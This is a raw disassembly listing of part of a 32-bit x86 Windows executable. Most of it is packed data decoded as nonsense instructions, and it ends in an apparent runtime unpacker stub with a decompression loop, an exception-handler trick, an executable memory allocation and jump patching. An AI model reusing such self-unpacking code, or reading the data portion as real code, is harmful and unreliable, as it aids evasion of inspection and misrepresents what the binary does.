  41e233:	f3 bc 57 48 36 67    	repz mov $0x67364857,%esp
  41e239:	14 e8                	adc    $0xe8,%al
  41e23b:	42                   	inc    %edx
  41e23c:	06                   	push   %es
  41e23d:	8c d6                	mov    %ss,%esi
  41e23f:	28 7e dc             	sub    %bh,-0x24(%esi)
  41e242:	c7                   	(bad)
  41e243:	08 a4 5d c4 20 80 87 	or     %ah,-0x787fdf3c(%ebp,%ebx,2)
  41e24a:	b5 8e                	mov    $0x8e,%ch
  41e24c:	81 24 01 16 98 0c 28 	andl   $0x280c9816,(%ecx,%eax,1)
  41e253:	5d                   	pop    %ebp
  41e254:	5e                   	pop    %esi
  41e255:	5f                   	pop    %edi
  41e256:	5b                   	pop    %ebx
  41e257:	c3                   	ret
  41e258:	7e ec                	jle    0x41e246
  41e25a:	83 c4 fc             	add    $0xfffffffc,%esp
  41e25d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41e25e:	e8 00 32 10 e1       	call   0xe1521463
  41e263:	5b                   	pop    %ebx
  41e264:	81 eb 7b 14 c9 75    	sub    $0x75c9147b,%ebx
  41e26a:	0e                   	push   %cs
  41e26b:	03 cb                	add    %ebx,%ecx
  41e26d:	51                   	push   %ecx
  41e26e:	a1 c0 42 24 ff       	mov    0xff2442c0,%eax
  41e273:	93                   	xchg   %eax,%ebx
  41e274:	96                   	xchg   %eax,%esi
  41e275:	89 45 9a             	mov    %eax,-0x66(%ebp)
  41e278:	56                   	push   %esi
  41e279:	04 47                	add    $0x47,%al
  41e27b:	d3 dd                	rcr    %cl,%ebp
  41e27d:	0f 98 c8             	sets   %al
  41e280:	fb                   	sti
  41e281:	33 c2                	xor    %edx,%eax
  41e283:	02 74 16 52          	add    0x52(%esi,%edx,1),%dh
  41e287:	20 32                	and    %dh,(%edx)
  41e289:	a8 7e                	test   $0x7e,%al
  41e28b:	c3                   	ret
  41e28c:	b1 75                	mov    $0x75,%cl
  41e28e:	fc                   	cld
  41e28f:	44                   	inc    %esp
  41e290:	9a ab 5a 83 c2 e0 66 	lcall  $0x66e0,$0xc2835aab
  41e297:	18 16                	sbb    %dl,(%esi)
  41e299:	04 eb                	add    $0xeb,%al
  41e29b:	e4 aa                	in     $0xaa,%al
  41e29d:	ac                   	lods   %ds:(%esi),%al
  41e29e:	06                   	push   %es
  41e29f:	75 c5                	jne    0x41e266
  41e2a1:	af                   	scas   %es:(%edi),%eax
  41e2a2:	c9                   	leave
  41e2a3:	1e                   	push   %ds
  41e2a4:	90                   	nop
  41e2a5:	28 8a 5e af 01 d0    	sub    %cl,-0x2ffe50a2(%edx)
  41e2ab:	cd c1                	int    $0xc1
  41e2ad:	24 7e                	and    $0x7e,%al
  41e2af:	54                   	push   %esp
  41e2b0:	9e                   	sahf
  41e2b1:	66 4d                	dec    %bp
  41e2b3:	c8 0c ad af          	enter  $0xad0c,$0xaf
  41e2b7:	46                   	inc    %esi
  41e2b8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41e2b9:	e0 87                	loopne 0x41e242
  41e2bb:	07                   	pop    %es
  41e2bc:	03 c2                	add    %edx,%eax
  41e2be:	89 08                	mov    %ecx,(%eax)
  41e2c0:	eb f4                	jmp    0x41e2b6
  41e2c2:	99                   	cltd
  41e2c3:	0c e2                	or     $0xe2,%al
  41e2c5:	21 53 ae             	and    %edx,-0x52(%ebx)
  41e2c8:	54                   	push   %esp
  41e2c9:	e8 cf 15 01 56       	call   0x5642f89d
  41e2ce:	8e 1a                	mov    (%edx),%ds
  41e2d0:	3c e1                	cmp    $0xe1,%al
  41e2d2:	4e                   	dec    %esi
  41e2d3:	3c 74                	cmp    $0x74,%al
  41e2d5:	0a 9c 04 24 32 f6 fe 	or     -0x109cddc(%esp,%eax,1),%bl
  41e2dc:	2e 50                	cs push %eax
  41e2de:	eb 07                	jmp    0x41e2e7
  41e2e0:	2c 89                	sub    $0x89,%al
  41e2e2:	e5 1d                	in     $0x1d,%eax
  41e2e4:	62 01                	bound  %eax,(%ecx)
  41e2e6:	55                   	push   %ebp
  41e2e7:	f8                   	clc
  41e2e8:	0f b7 46 10          	movzwl 0x10(%esi),%eax
  41e2ec:	a9 80 75 7d ad       	test   $0xad7d7580,%eax
  41e2f1:	42                   	inc    %edx
  41e2f2:	32 29                	xor    (%ecx),%ch
  41e2f4:	1e                   	push   %ds
  41e2f5:	77 74                	ja     0x41e36b
  41e2f7:	78 6c                	js     0x41e365
  41e2f9:	0f c0 c7             	xadd   %al,%bh
  41e2fc:	ec                   	in     (%dx),%al
  41e2fd:	4d                   	dec    %ebp
  41e2fe:	fc                   	cld
  41e2ff:	40                   	inc    %eax
  41e300:	5e                   	pop    %esi
  41e301:	12 36                	adc    (%esi),%dh
  41e303:	03 75 f8             	add    -0x8(%ebp),%esi
  41e306:	3b cf                	cmp    %edi,%ecx
  41e308:	7d 34                	jge    0x41e33e
  41e30a:	e8 b3 07 20 06       	call   0x661eac2
  41e30f:	46                   	inc    %esi
  41e310:	0f b6 d0             	movzbl %al,%edx
  41e313:	01 55 fc             	add    %edx,-0x4(%ebp)
  41e316:	2c e8                	sub    $0xe8,%al
  41e318:	d3 74 fe c8          	shll   %cl,-0x38(%esi,%edi,8)
  41e31c:	8a 61 0e             	mov    0xe(%ecx),%ah
  41e31f:	ec                   	in     (%dx),%al
  41e320:	18 d7                	sbb    %dl,%bh
  41e322:	75 1c                	jne    0x41e340
  41e324:	2a 38                	sub    (%eax),%bh
  41e326:	d0 0d 66 c1 e8 08    	rorb   $1,0x8e8c166
  41e32c:	c0 10 86             	rclb   $0x86,(%eax)
  41e32f:	c4 3f                	les    (%edi),%edi
  41e331:	67 48                	addr16 dec %eax
  41e333:	34 0e                	xor    $0xe,%al
  41e335:	06                   	push   %es
  41e336:	01 bb ce 04 0d 24    	add    %edi,0x240d04ce(%ebx)
  41e33c:	c1 5c 41 eb c8       	rcrl   $0xc8,-0x15(%ecx,%eax,2)
  41e341:	5e                   	pop    %esi
  41e342:	59                   	pop    %ecx
  41e343:	bc 46 14 74 35       	mov    $0x35741446,%esp
  41e348:	3b 2a                	cmp    (%edx),%ebp
  41e34a:	53                   	push   %ebx
  41e34b:	84 62 d5             	test   %ah,-0x2b(%edx)
  41e34e:	30 95 6a 16 84 1a    	xor    %dl,0x1a84166a(%ebp)
  41e354:	98                   	cwtl
  41e355:	30 0f                	xor    %cl,(%edi)
  41e357:	e9 88 fd b3 eb       	jmp    0xebf5e0e4
  41e35c:	17                   	pop    %ss
  41e35d:	51                   	push   %ecx
  41e35e:	8e 37                	mov    (%edi),%?
  41e360:	f8                   	clc
  41e361:	e9 02 7f 80 32       	jmp    0x32c26268
  41e366:	83 ec 02             	sub    $0x2,%esp
  41e369:	66 76 12             	data16 jbe 0x41e37e
  41e36c:	52                   	push   %edx
  41e36d:	50                   	push   %eax
  41e36e:	e8 a9 64 59 74       	call   0x749b481c
  41e373:	d4 04                	aam    $0x4
  41e375:	8b 8e 1c 49 2f 57    	mov    0x572f491c(%esi),%ecx
  41e37b:	d6                   	salc
  41e37c:	b3 fb                	mov    $0xfb,%bl
  41e37e:	fd                   	std
  41e37f:	11 2b                	adc    %ebp,(%ebx)
  41e381:	e5 b4                	in     $0xb4,%eax
  41e383:	16                   	push   %ss
  41e384:	a2 50 6e ea 8e       	mov    %al,0x8eea6e50
  41e389:	4e                   	dec    %esi
  41e38a:	de cd                	fmulp  %st,%st(5)
  41e38c:	43                   	inc    %ebx
  41e38d:	ed                   	in     (%dx),%eax
  41e38e:	8b 61 32             	mov    0x32(%ecx),%esp
  41e391:	c4 6c 74 4d          	les    0x4d(%esp,%esi,2),%ebp
  41e395:	e0 73                	loopne 0x41e40a
  41e397:	5c                   	pop    %esp
  41e398:	7d 28                	jge    0x41e3c2
  41e39a:	4b                   	dec    %ebx
  41e39b:	08 3e                	or     %bh,(%esi)
  41e39d:	b0 10                	mov    $0x10,%al
  41e39f:	27                   	daa
  41e3a0:	e7 c1                	out    %eax,$0xc1
  41e3a2:	f9                   	stc
  41e3a3:	02 f3                	add    %bl,%dh
  41e3a5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41e3a6:	1d 83 e1 82 34       	sbb    $0x3482e183,%eax
  41e3ab:	14 d9                	adc    $0xd9,%al
  41e3ad:	ee                   	out    %al,(%dx)
  41e3ae:	7b 04                	jnp    0x41e3b4
  41e3b0:	16                   	push   %ss
  41e3b1:	fa                   	cli
  41e3b2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41e3b3:	6f                   	outsl  %ds:(%esi),(%dx)
  41e3b4:	d1 b3 21 c4 87 19    	shll   $1,0x1987c421(%ebx)
  41e3ba:	ab                   	stos   %eax,%es:(%edi)
  41e3bb:	ca aa 5a             	lret   $0x5aaa
  41e3be:	ce                   	into
  41e3bf:	60                   	pusha
  41e3c0:	3b 05 04 d2 68 32    	cmp    0x3268d204,%eax
  41e3c6:	3d 32 a6 c3 75       	cmp    $0x75c3a632,%eax
  41e3cb:	a2 f4 47 79 6a       	mov    %al,0x6a7947f4
  41e3d0:	a2 17 6e 24 18       	mov    %al,0x18246e17
  41e3d5:	50                   	push   %eax
  41e3d6:	9c                   	pushf
  41e3d7:	9a 47 02 0e f0 51 52 	lcall  $0x5251,$0xf00e0247
  41e3de:	56                   	push   %esi
  41e3df:	91                   	xchg   %eax,%ecx
  41e3e0:	14 2a                	adc    $0x2a,%al
  41e3e2:	32 52 8a             	xor    -0x76(%edx),%dl
  41e3e5:	d6                   	salc
  41e3e6:	89 bb bf f0 a0 c6    	mov    %edi,-0x395f0f41(%ebx)
  41e3ec:	c5 7d ec             	lds    -0x14(%ebp),%edi
  41e3ef:	16                   	push   %ss
  41e3f0:	6e                   	outsb  %ds:(%esi),(%dx)
  41e3f1:	48                   	dec    %eax
  41e3f2:	2b c8                	sub    %eax,%ecx
  41e3f4:	36 e6 cb             	ss out %al,$0xcb
  41e3f7:	44                   	inc    %esp
  41e3f8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41e3f9:	b2 5e                	mov    $0x5e,%dl
  41e3fb:	20 7c 16 33          	and    %bh,0x33(%esi,%edx,1)
  41e3ff:	6a 48                	push   $0x48
  41e401:	04 60                	add    $0x60,%al
  41e403:	ca bb d0             	lret   $0xd0bb
  41e406:	48                   	dec    %eax
  41e407:	0e                   	push   %cs
  41e408:	f4                   	hlt
  41e409:	52                   	push   %edx
  41e40a:	c4 22                	les    (%edx),%esp
  41e40c:	a9 4f 49 08 54       	test   $0x5408494f,%eax
  41e411:	0f 8d 8b 70 f8 d9    	jge    0xda3a54a2
  41e417:	d9 6f 51             	fldcw  0x51(%edi)
  41e41a:	1e                   	push   %ds
  41e41b:	06                   	push   %es
  41e41c:	ec                   	in     (%dx),%al
  41e41d:	d0 c8                	ror    $1,%al
  41e41f:	40                   	inc    %eax
  41e420:	d4 dd                	aam    $0xdd
  41e422:	92                   	xchg   %eax,%edx
  41e423:	71 74                	jno    0x41e499
  41e425:	b5 46                	mov    $0x46,%ch
  41e427:	12 29                	adc    (%ecx),%ch
  41e429:	6e                   	outsb  %ds:(%esi),(%dx)
  41e42a:	fb                   	sti
  41e42b:	9f                   	lahf
  41e42c:	41                   	inc    %ecx
  41e42d:	15 36 8f 06 8c       	adc    $0x8c068f36,%eax
  41e432:	0b 6b c2             	or     -0x3e(%ebx),%ebp
  41e435:	eb ca                	jmp    0x41e401
  41e437:	5a                   	pop    %edx
  41e438:	1b 90 fa 3b 7d 96    	sbb    -0x6982c406(%eax),%edx
  41e43e:	0e                   	push   %cs
  41e43f:	f9                   	stc
  41e440:	c1 27 f3             	shll   $0xf3,(%edi)
  41e443:	28 eb                	sub    %ch,%bl
  41e445:	11 da                	adc    %ebx,%edx
  41e447:	40                   	inc    %eax
  41e448:	c7 05 ff 0f df dc 1c 	movl   $0x10aaa41c,0xdcdf0fff
  41e44f:	a4 aa 10 
  41e452:	0c e0                	or     $0xe0,%al
  41e454:	2b f3                	sub    %ebx,%esi
  41e456:	38 2e                	cmp    %ch,(%esi)
  41e458:	75 9c                	jne    0x41e3f6
  41e45a:	49                   	dec    %ecx
  41e45b:	5e                   	pop    %esi
  41e45c:	ed                   	in     (%dx),%eax
  41e45d:	6a 91                	push   $0xffffff91
  41e45f:	93                   	xchg   %eax,%ebx
  41e460:	da 0b                	fimull (%ebx)
  41e462:	40                   	inc    %eax
  41e463:	08 2d a6 fd b3 24    	or     %ch,0x24b3fda6
  41e469:	2d 40 c9 d7 24       	sub    $0x24d7c940,%eax
  41e46e:	49                   	dec    %ecx
  41e46f:	b0 7c                	mov    $0x7c,%al
  41e471:	f1                   	int1
  41e472:	5d                   	pop    %ebp
  41e473:	c0 39 9a             	sarb   $0x9a,(%ecx)
  41e476:	9f                   	lahf
  41e477:	1b ea                	sbb    %edx,%ebp
  41e479:	20 f4                	and    %dh,%ah
  41e47b:	06                   	push   %es
  41e47c:	74 24                	je     0x41e4a2
  41e47e:	03 08                	add    (%eax),%ecx
  41e480:	48                   	dec    %eax
  41e481:	e2 82                	loop   0x41e405
  41e483:	44                   	inc    %esp
  41e484:	43                   	inc    %ebx
  41e485:	8f                   	(bad)
  41e486:	4e                   	dec    %esi
  41e487:	79 0c                	jns    0x41e495
  41e489:	7e 10                	jle    0x41e49b
  41e48b:	95                   	xchg   %eax,%ebp
  41e48c:	13 d0                	adc    %eax,%edx
  41e48e:	33 85 ff 21 7b 50    	xor    0x507b21ff(%ebp),%eax
  41e494:	57                   	push   %edi
  41e495:	51                   	push   %ecx
  41e496:	53                   	push   %ebx
  41e497:	e8 18 01 28 fc       	call   0xfc69e5b4
  41e49c:	6e                   	outsb  %ds:(%esi),(%dx)
  41e49d:	0a 59 48             	or     0x48(%ecx),%bl
  41e4a0:	c6                   	(bad)
  41e4a1:	e7 b1                	out    %eax,$0xb1
  41e4a3:	22 dd                	and    %ch,%bl
  41e4a5:	12 14 eb             	adc    (%ebx,%ebp,8),%dl
  41e4a8:	c5 b6 1b 71 19 21    	lds    0x2119711b(%esi),%esi
  41e4ae:	5b                   	pop    %ebx
  41e4af:	4a                   	dec    %edx
  41e4b0:	10 45 0c             	adc    %al,0xc(%ebp)
  41e4b3:	89 83 d8 c2 10 5f    	mov    %eax,0x5f10c2d8(%ebx)
  41e4b9:	dc 52 22             	fcoml  0x22(%edx)
  41e4bc:	0e                   	push   %cs
  41e4bd:	f6 46 8b 93          	testb  $0x93,-0x75(%esi)
  41e4c1:	76 32                	jbe    0x41e4f5
  41e4c3:	f2 6a e9             	repnz push $0xffffffe9
  41e4c6:	27                   	daa
  41e4c7:	d3 d2                	rcl    %cl,%edx
  41e4c9:	ba 7f a1 cd 61       	mov    $0x61cda17f,%edx
  41e4ce:	c2 53 67             	ret    $0x6753
  41e4d1:	4e                   	dec    %esi
  41e4d2:	eb 4e                	jmp    0x41e522
  41e4d4:	5c                   	pop    %esp
  41e4d5:	03 ca                	add    %edx,%ecx
  41e4d7:	20 24 24             	and    %ah,(%esp)
  41e4da:	98                   	cwtl
  41e4db:	7a 7d                	jp     0x41e55a
  41e4dd:	80 55 14 85          	adcb   $0x85,0x14(%ebp)
  41e4e1:	d2 15 b3 eb d3 02    	rclb   %cl,0x2d3ebb3
  41e4e7:	d6                   	salc
  41e4e8:	f6 0d f2 c7 44 d1 f5 	testb  $0xf5,0xd144c7f2
  41e4ef:	f3 41                	repz inc %ecx
  41e4f1:	60                   	pusha
  41e4f2:	85 40 52             	test   %eax,0x52(%eax)
  41e4f5:	5a                   	pop    %edx
  41e4f6:	42                   	inc    %edx
  41e4f7:	96                   	xchg   %eax,%esi
  41e4f8:	48                   	dec    %eax
  41e4f9:	55                   	push   %ebp
  41e4fa:	a9 22 09 25 20       	test   $0x20250922,%eax
  41e4ff:	16                   	push   %ss
  41e500:	24 2e                	and    $0x2e,%al
  41e502:	70 6a                	jo     0x41e56e
  41e504:	eb 0e                	jmp    0x41e514
  41e506:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41e507:	e3 41                	jecxz  0x41e54a
  41e509:	32 0e                	xor    (%esi),%cl
  41e50b:	1e                   	push   %ds
  41e50c:	56                   	push   %esi
  41e50d:	e3 b0                	jecxz  0x41e4bf
  41e50f:	51                   	push   %ecx
  41e510:	40                   	inc    %eax
  41e511:	1c 96                	sbb    $0x96,%al
  41e513:	89 8c 54 8a 5a 69 9d 	mov    %ecx,-0x6296a576(%esp,%edx,2)
  41e51a:	c2 27 d1             	ret    $0xd127
  41e51d:	84 92 02 5b c4 eb    	test   %dl,-0x143ba4fe(%edx)
  41e523:	b0 9e                	mov    $0x9e,%al
  41e525:	55                   	push   %ebp
  41e526:	e4 35                	in     $0x35,%al
  41e528:	6b a4 8d fc 3a d7 06 	imul   $0x58,0x6d73afc(%ebp,%ecx,4),%esp
  41e52f:	58 
  41e530:	7b f3                	jnp    0x41e525
  41e532:	33 30                	xor    (%eax),%esi
  41e534:	2b f1                	sub    %ecx,%esi
  41e536:	89 c8                	mov    %ecx,%eax
  41e538:	e0 f4                	loopne 0x41e52e
  41e53a:	15 d7 41 19 1c       	adc    $0x1c1941d7,%eax
  41e53f:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  41e542:	fc                   	cld
  41e543:	eb f3                	jmp    0x41e538
  41e545:	36 54                	ss push %esp
  41e547:	94                   	xchg   %eax,%esp
  41e548:	4e                   	dec    %esi
  41e549:	82 74 fc 38 21       	xorb   $0x21,0x38(%esp,%edi,8)
  41e54e:	01 42 50             	add    %eax,0x50(%edx)
  41e551:	22 9c 1a 45 b5 40 3c 	and    0x3c40b545(%edx,%ebx,1),%bl
  41e558:	48                   	dec    %eax
  41e559:	14 8d                	adc    $0x8d,%al
  41e55b:	7c 01                	jl     0x41e55e
  41e55d:	18 25 c9 05 d3 5e    	sbb    %ah,0x5ed305c9
  41e563:	50                   	push   %eax
  41e564:	6a 04                	push   $0x4
  41e566:	68 bf cc e8 a0       	push   $0xa0e8ccbf
  41e56b:	20 02                	and    %al,(%edx)
  41e56d:	c1 82 8a 47 27 a8 e9 	roll   $0xe9,-0x57d8b876(%edx)
  41e574:	05 2c 88 4c 1a       	add    $0x1a4c882c,%eax
  41e579:	45                   	inc    %ebp
  41e57a:	d0 12                	rclb   $1,(%edx)
  41e57c:	20 da                	and    %bl,%dl
  41e57e:	21 a7 24 8a 2c e4    	and    %esp,-0x1bd375dc(%edi)
  41e584:	5e                   	pop    %esi
  41e585:	fa                   	cli
  41e586:	22 96 08 64 12 6a    	and    0x6a126408(%esi),%dl
  41e58c:	1c 1b                	sbb    $0x1b,%al
  41e58e:	90                   	nop
  41e58f:	25 9a 88 03 ff       	and    $0xff03889a,%eax
  41e594:	53                   	push   %ebx
  41e595:	41                   	inc    %ecx
  41e596:	70 6c                	jo     0x41e604
  41e598:	69 63 6e 8f 03 3a 61 	imul   $0x613a038f,0x6e(%ebx),%esp
  41e59f:	74 6f                	je     0x41e610
  41e5a1:	6e                   	outsb  %ds:(%esi),(%dx)
  41e5a2:	20 65 72             	and    %ah,0x72(%ebp)
  41e5a5:	99                   	cltd
  41e5a6:	1e                   	push   %ds
  41e5a7:	0f 7c                	(bad)
  41e5a9:	54                   	push   %esp
  41e5aa:	68 70 12 63 be       	push   $0xbe631270
  41e5af:	8f                   	(bad)
  41e5b0:	ff                   	(bad)
  41e5b1:	f8                   	clc
  41e5b2:	64 75 14             	fs jne 0x41e5c9
  41e5b5:	25 73 f2 7c 79       	and    $0x797cf273,%eax
  41e5ba:	be 6c 6e be de       	mov    $0xdebe6e6c,%esi
  41e5bf:	fa                   	cli
  41e5c0:	ec                   	in     (%dx),%al
  41e5c1:	74 62                	je     0x41e625
  41e5c3:	20 e3                	and    %ah,%bl
  41e5c5:	bb fd ed 5b 36       	mov    $0x365bedfd,%ebx
  41e5ca:	69 5e 53 44 4c dd 98 	imul   $0x98dd4c44,0x53(%esi),%ebx
  41e5d1:	55                   	push   %ebp
  41e5d2:	8e 47 2e             	mov    0x2e(%edi),%es
  41e5d5:	35 78 64 2c 61       	xor    $0x612c6478,%eax
  41e5da:	6c                   	insb   (%dx),%es:(%edi)
  41e5db:	20 76 1f             	and    %dh,0x1f(%esi)
  41e5de:	5e                   	pop    %esi
  41e5df:	e9 33 46 69 6c       	jmp    0x6cab2c17
  41e5e4:	53                   	push   %ebx
  41e5e5:	e8 a5 53 c1 19       	call   0x1a03398f
  41e5ea:	75 70                	jne    0x41e65c
  41e5ec:	74 1c                	je     0x41e60a
  41e5ee:	2a db                	sub    %bl,%bl
  41e5f0:	a1 e7 07 07 c5       	mov    0xc50707e7,%eax
  41e5f5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41e5f6:	27                   	daa
  41e5f7:	75 73                	jne    0x41e66c
  41e5f9:	94                   	xchg   %eax,%esp
  41e5fa:	33 32                	xor    (%edx),%esi
  41e5fc:	4d                   	dec    %ebp
  41e5fd:	61                   	popa
  41e5fe:	4f                   	dec    %edi
  41e5ff:	1e                   	push   %ds
  41e600:	6f                   	outsl  %ds:(%esi),(%dx)
  41e601:	61                   	popa
  41e602:	67 42                	addr16 inc %edx
  41e604:	6f                   	outsl  %ds:(%esi),(%dx)
  41e605:	78 41                	js     0x41e648
  41e607:	64 8c ee             	fs mov %gs,%esi
  41e60a:	c1 77 9d 94          	shll   $0x94,-0x63(%edi)
  41e60e:	74 66                	je     0x41e676
  41e610:	14 0d                	adc    $0xd,%al
  41e612:	cc                   	int3
  41e613:	c4 bf 89 ef 09 d4    	les    -0x2bf61077(%edi),%edi
  41e619:	73 c0                	jae    0x41e5db
  41e61b:	09 cc                	or     %ecx,%esp
  41e61d:	05 36 67 a6 41       	add    $0x41a66736,%eax
  41e622:	6b 70 6e 6c          	imul   $0x6c,0x6e(%eax),%esi
  41e626:	77 45                	ja     0x41e66d
  41e628:	78 69                	js     0x41e693
  41e62a:	74 50                	je     0x41e67c
  41e62c:	06                   	push   %es
  41e62d:	a3 e0 26 ce 84       	mov    %eax,0x84ce26e0
  41e632:	43                   	inc    %ebx
  41e633:	8a a0 48 61 6e 64    	mov    0x646e6148(%eax),%ah
  41e639:	f2 58                	repnz pop %eax
  41e63b:	f1                   	int1
  41e63c:	7a e0                	jp     0x41e61e
  41e63e:	4f                   	dec    %edi
  41e63f:	70 18                	jo     0x41e659
  41e641:	47                   	inc    %edi
  41e642:	4d                   	dec    %ebp
  41e643:	a1 7a fe 74 4d       	mov    0x4d74fe7a,%eax
  41e648:	ee                   	out    %al,(%dx)
  41e649:	6c                   	insb   (%dx),%es:(%edi)
  41e64a:	1c 07                	sbb    $0x7,%al
  41e64c:	1a fd                	sbb    %ch,%bh
  41e64e:	83 b4 56 69 72 74 ca 	xorl   $0x41,-0x358b8d97(%esi,%edx,2)
  41e655:	41 
  41e656:	b8 63 91 c8 0c       	mov    $0xcc89163,%eax
  41e65b:	ae                   	scas   %es:(%edi),%al
  41e65c:	16                   	push   %ss
  41e65d:	c3                   	ret
  41e65e:	3a 09                	cmp    (%ecx),%cl
  41e660:	22 2e                	and    (%esi),%ch
  41e662:	c9                   	leave
  41e663:	4e                   	dec    %esi
  41e664:	e1 22                	loope  0x41e688
  41e666:	4b                   	dec    %ebx
  41e667:	01 ef                	add    %ebp,%edi
  41e669:	ff 2a                	ljmp   *(%edx)
  41e66b:	24 25                	and    $0x25,%al
  41e66d:	89 11                	mov    %edx,(%ecx)
  41e66f:	c6 01 00             	movb   $0x0,(%ecx)
  41e672:	00 00                	add    %al,(%eax)
  41e674:	60                   	pusha
  41e675:	00 60 8b             	add    %ah,-0x75(%eax)
  41e678:	74 24                	je     0x41e69e
  41e67a:	24 8b                	and    $0x8b,%al
  41e67c:	7c 24                	jl     0x41e6a2
  41e67e:	28 fc                	sub    %bh,%ah
  41e680:	33 db                	xor    %ebx,%ebx
  41e682:	33 d2                	xor    %edx,%edx
  41e684:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41e685:	b3 02                	mov    $0x2,%bl
  41e687:	e8 6d 00 00 00       	call   0x41e6f9
  41e68c:	73 f6                	jae    0x41e684
  41e68e:	33 c9                	xor    %ecx,%ecx
  41e690:	e8 64 00 00 00       	call   0x41e6f9
  41e695:	73 1c                	jae    0x41e6b3
  41e697:	33 c0                	xor    %eax,%eax
  41e699:	e8 5b 00 00 00       	call   0x41e6f9
  41e69e:	73 23                	jae    0x41e6c3
  41e6a0:	b3 02                	mov    $0x2,%bl
  41e6a2:	41                   	inc    %ecx
  41e6a3:	b0 10                	mov    $0x10,%al
  41e6a5:	e8 4f 00 00 00       	call   0x41e6f9
  41e6aa:	12 c0                	adc    %al,%al
  41e6ac:	73 f7                	jae    0x41e6a5
  41e6ae:	75 3f                	jne    0x41e6ef
  41e6b0:	aa                   	stos   %al,%es:(%edi)
  41e6b1:	eb d4                	jmp    0x41e687
  41e6b3:	e8 4e 00 00 00       	call   0x41e706
  41e6b8:	2b cb                	sub    %ebx,%ecx
  41e6ba:	75 10                	jne    0x41e6cc
  41e6bc:	e8 43 00 00 00       	call   0x41e704
  41e6c1:	eb 28                	jmp    0x41e6eb
  41e6c3:	ac                   	lods   %ds:(%esi),%al
  41e6c4:	d1 e8                	shr    $1,%eax
  41e6c6:	74 4e                	je     0x41e716
  41e6c8:	13 c9                	adc    %ecx,%ecx
  41e6ca:	eb 1c                	jmp    0x41e6e8
  41e6cc:	91                   	xchg   %eax,%ecx
  41e6cd:	48                   	dec    %eax
  41e6ce:	c1 e0 08             	shl    $0x8,%eax
  41e6d1:	ac                   	lods   %ds:(%esi),%al
  41e6d2:	e8 2d 00 00 00       	call   0x41e704
  41e6d7:	3d 00 7d 00 00       	cmp    $0x7d00,%eax
  41e6dc:	73 0a                	jae    0x41e6e8
  41e6de:	80 fc 05             	cmp    $0x5,%ah
  41e6e1:	73 06                	jae    0x41e6e9
  41e6e3:	83 f8 7f             	cmp    $0x7f,%eax
  41e6e6:	77 02                	ja     0x41e6ea
  41e6e8:	41                   	inc    %ecx
  41e6e9:	41                   	inc    %ecx
  41e6ea:	95                   	xchg   %eax,%ebp
  41e6eb:	8b c5                	mov    %ebp,%eax
  41e6ed:	b3 01                	mov    $0x1,%bl
  41e6ef:	56                   	push   %esi
  41e6f0:	8b f7                	mov    %edi,%esi
  41e6f2:	2b f0                	sub    %eax,%esi
  41e6f4:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  41e6f6:	5e                   	pop    %esi
  41e6f7:	eb 8e                	jmp    0x41e687
  41e6f9:	03 d2                	add    %edx,%edx
  41e6fb:	75 06                	jne    0x41e703
  41e6fd:	92                   	xchg   %eax,%edx
  41e6fe:	ad                   	lods   %ds:(%esi),%eax
  41e6ff:	92                   	xchg   %eax,%edx
  41e700:	03 d2                	add    %edx,%edx
  41e702:	42                   	inc    %edx
  41e703:	c3                   	ret
  41e704:	33 c9                	xor    %ecx,%ecx
  41e706:	41                   	inc    %ecx
  41e707:	e8 ed ff ff ff       	call   0x41e6f9
  41e70c:	13 c9                	adc    %ecx,%ecx
  41e70e:	e8 e6 ff ff ff       	call   0x41e6f9
  41e713:	72 f2                	jb     0x41e707
  41e715:	c3                   	ret
  41e716:	2b 7c 24 28          	sub    0x28(%esp),%edi
  41e71a:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  41e71e:	61                   	popa
  41e71f:	c2 0c 00             	ret    $0xc
  41e722:	00 00                	add    %al,(%eax)
  41e724:	14 e0                	adc    $0xe0,%al
  41e726:	01 00                	add    %eax,(%eax)
  41e728:	bc 0c 00 00 e8       	mov    $0xe800000c,%esp
  41e72d:	01 00                	add    %eax,(%eax)
  41e72f:	00 76 e6             	add    %dh,-0x1a(%esi)
  41e732:	01 00                	add    %eax,(%eax)
  41e734:	68 df 01 00 6c       	push   $0x6c0001df
  41e739:	df 01                	filds  (%ecx)
  41e73b:	00 00                	add    %al,(%eax)
  41e73d:	00 40 00             	add    %al,0x0(%eax)
  41e740:	60                   	pusha
  41e741:	df 01                	filds  (%ecx)
  41e743:	00 64 df 01          	add    %ah,0x1(%edi,%ebx,8)
  41e747:	00 b8 4f d5 41 f0    	add    %bh,-0xfbe2ab1(%eax)
  41e74d:	8d 88 1c 12 00 10    	lea    0x1000121c(%eax),%ecx
  41e753:	89 41 01             	mov    %eax,0x1(%ecx)
  41e756:	8b 54 24 04          	mov    0x4(%esp),%edx
  41e75a:	8b 52 0c             	mov    0xc(%edx),%edx
  41e75d:	c6 02 e9             	movb   $0xe9,(%edx)
  41e760:	83 c2 05             	add    $0x5,%edx
  41e763:	2b ca                	sub    %edx,%ecx
  41e765:	89 4a fc             	mov    %ecx,-0x4(%edx)
  41e768:	33 c0                	xor    %eax,%eax
  41e76a:	c3                   	ret
  41e76b:	b8 78 56 34 12       	mov    $0x12345678,%eax
  41e770:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  41e777:	83 c4 04             	add    $0x4,%esp
  41e77a:	55                   	push   %ebp
  41e77b:	53                   	push   %ebx
  41e77c:	51                   	push   %ecx
  41e77d:	57                   	push   %edi
  41e77e:	56                   	push   %esi
  41e77f:	52                   	push   %edx
  41e780:	8d 98 d5 11 00 10    	lea    0x100011d5(%eax),%ebx
  41e786:	8b 53 18             	mov    0x18(%ebx),%edx
  41e789:	52                   	push   %edx
  41e78a:	8b e8                	mov    %eax,%ebp
  41e78c:	6a 40                	push   $0x40
  41e78e:	68 00 10 00 00       	push   $0x1000
  41e793:	ff 73 04             	push   0x4(%ebx)
  41e796:	6a 00                	push   $0x0
  41e798:	8b 4b 10             	mov    0x10(%ebx),%ecx
  41e79b:	03 ca                	add    %edx,%ecx
  41e79d:	8b 01                	mov    (%ecx),%eax
  41e79f:	ff d0                	call   *%eax
  41e7a1:	5a                   	pop    %edx
